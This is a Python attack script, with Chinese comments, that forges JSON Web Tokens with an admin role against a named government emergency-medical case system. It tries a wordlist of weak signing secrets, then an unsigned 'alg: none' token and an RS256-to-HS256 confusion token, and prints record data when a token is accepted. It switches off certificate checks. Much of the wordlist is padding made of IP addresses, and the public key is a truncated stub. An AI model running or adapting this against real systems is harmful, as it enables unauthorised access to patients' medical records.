import http.client
import json
import ssl
import base64
import hmac
import hashlib
import time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# 测试 JWT 弱密钥
print('=== JWT 弱密钥测试 ===')

def base64url_decode(input):
    input += '=' * (4 - len(input) % 4)
    return base64.urlsafe_b64decode(input)

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def create_jwt(header, payload, key, algorithm='HS256'):
    header_b64 = base64url_encode(json.dumps(header, separators=(',', ':')))
    payload_b64 = base64url_encode(json.dumps(payload, separators=(',', ':')))
    signing_input = f'{header_b64}.{payload_b64}'

    if algorithm == 'HS256':
        signature = hmac.new(key.encode('utf-8'), signing_input.encode('utf-8'), hashlib.sha256).digest()
        signature_b64 = base64url_encode(signature)
        return f'{signing_input}.{signature_b64}'

    return f'{signing_input}'  # 未签名

# 测试各种弱密钥
secrets = [
    'secret',
    'password',
    'epcr',
    'epcr-secret',
    'epcr_secret',
    'epcr.key',
    'epcr-key',
    'epcr2024',
    'epcr2023',
    'epcr2022',
    'tpf',
    'tpf-secret',
    'tpf_secret',
    'tpf.gov.tw',
    'gov.tw',
    'tpfgov',
    'epcr.tpf.gov.tw',
    'epcr_tpf',
    'epcr-tpf',
    'medical',
    'ems',
    'emergency',
    'patient',
    'hospital',
    'admin',
    'administrator',
    'superadmin',
    'root',
    'test',
    'testing',
    'development',
    'production',
    'dev',
    'prod',
    'staging',
    '123456',
    '12345678',
    '123456789',
    '1234567890',
    'abc123',
    'abc12345',
    'qwerty',
    'letmein',
    'monkey',
    'dragon',
    'master',
    '654321',
    'iloveyou',
    '000000',
    '111111',
    '123123',
    '123abc',
    'a12345',
    'password1',
    'password123',
    'passw0rd',
    'pass123',
    'p@ssw0rd',
    'p@ss',
    'p@ssw0rd!',
    'admin123',
    'admin@123',
    'admin1234',
    'admin12345',
    'admin123456',
    'administrator',
    'administrator1',
    'administrator123',
    'superuser',
    'superuser1',
    'superuser123',
    'root123',
    'root1234',
    'root12345',
    'root123456',
    'test123',
    'test1234',
    'test12345',
    'test123456',
    'guest',
    'guest1',
    'guest123',
    'user',
    'user1',
    'user123',
    'default',
    'default1',
    'default123',
    'changeme',
    'change',
    'change1',
    'change123',
    'initial',
    'initial1',
    'initial123',
    'temp',
    'temp1',
    'temp123',
    'temporary',
    'temporary1',
    'temporary123',
    'placeholder',
    'placeholder1',
    'placeholder123',
    'sample',
    'sample1',
    'sample123',
    'example',
    'example1',
    'example123',
    'demo',
    'demo1',
    'demo123',
    'debug',
    'debug1',
    'debug123',
    'development1',
    'development123',
    'staging1',
    'staging123',
    'production1',
    'production123',
    'local',
    'local1',
    'local123',
    'localhost',
    'localhost1',
    'localhost123',
    '127.0.0.1',
    '127.0.0.11',
    '127.0.0.123',
    '0.0.0.0',
    '0.0.0.00',
    '0.0.0.000',
    '192.168.1.1',
    '192.168.1.10',
    '192.168.1.100',
    '192.168.1.255',
    '10.0.0.1',
    '10.0.0.10',
    '10.0.0.100',
    '10.0.0.255',
    '172.16.0.1',
    '172.16.0.10',
    '172.16.0.100',
    '172.16.0.255',
    '8.8.8.8',
    '8.8.4.4',
    '1.1.1.1',
    '1.0.0.1',
    '9.9.9.9',
    '208.67.222.222',
    '208.67.220.220',
    '4.2.2.1',
    '4.2.2.2',
    '64.4.64.4',
    '64.4.70.25',
    '64.4.64.44',
    '72.14.207.99',
    '72.14.207.100',
    '74.125.45.100',
    '74.125.45.101',
    '74.125.45.102',
    '74.125.45.103',
    '74.125.45.104',
    '74.125.45.105',
    '74.125.45.106',
    '74.125.45.107',
    '74.125.45.108',
    '74.125.45.109',
    '74.125.45.110',
    '74.125.45.111',
    '74.125.45.112',
    '74.125.45.113',
    '74.125.45.114',
    '74.125.45.115',
    '74.125.45.116',
    '74.125.45.117',
    '74.125.45.118',
    '74.125.45.119',
    '74.125.45.120',
    '74.125.45.121',
    '74.125.45.122',
    '74.125.45.123',
    '74.125.45.124',
    '74.125.45.125',
    '74.125.45.126',
    '74.125.45.127',
]

# 创建测试 payload
payload = {
    'sub': '1234567890',
    'name': 'Test User',
    'email': 'test@example.com',
    'role': 'admin',
    'iat': int(time.time()),
    'exp': int(time.time()) + 3600,
    'iss': 'epcr.tpf.gov.tw',
    'aud': 'epcr-app'
}

header = {
    'alg': 'HS256',
    'typ': 'JWT'
}

# 测试每个密钥
print('Testing JWT with various secrets...')
for i, secret in enumerate(secrets[:100]):  # 先测试前 100 个
    token = create_jwt(header, payload, secret)

    conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4000, timeout=5, context=ctx)
    headers = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }
    conn.request('GET', '/cases', headers=headers)
    resp = conn.getresponse()
    data = resp.read().decode('utf-8', errors='replace')

    if resp.status == 200:
        print(f'SUCCESS! Secret: {secret}')
        print(f'  Token: {token[:50]}...')
        print(f'  Body: {data[:200]}')
        break
    elif resp.status == 401:
        pass  # 继续
    elif resp.status == 403:
        print(f'403 (Forbidden) with secret: {secret}')
    elif resp.status == 500:
        print(f'500 (Server Error) with secret: {secret}')
        print(f'  Body: {data[:200]}')
    conn.close()

# 测试 alg: none
print('\nTesting JWT with alg: none...')
header_none = {'alg': 'none', 'typ': 'JWT'}
token_none = create_jwt(header_none, payload, '')

conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4000, timeout=5, context=ctx)
headers = {
    'Authorization': f'Bearer {token_none}',
    'Content-Type': 'application/json'
}
conn.request('GET', '/cases', headers=headers)
resp = conn.getresponse()
data = resp.read().decode('utf-8', errors='replace')
print(f'  Status: {resp.status}')
print(f'  Body: {data[:200]}')
conn.close()

# 测试 RS256 -> HS256 混淆
print('\nTesting JWT with RS256 header but HS256 signature...')
header_rs256 = {'alg': 'RS256', 'typ': 'JWT'}
# 使用公钥作为密钥
public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA\n-----END PUBLIC KEY-----"
token_rs256_hs256 = create_jwt(header_rs256, payload, public_key, 'HS256')

conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4000, timeout=5, context=ctx)
headers = {
    'Authorization': f'Bearer {token_rs256_hs256}',
    'Content-Type': 'application/json'
}
conn.request('GET', '/cases', headers=headers)
resp = conn.getresponse()
data = resp.read().decode('utf-8', errors='replace')
print(f'  Status: {resp.status}')
print(f'  Body: {data[:200]}')
conn.close()
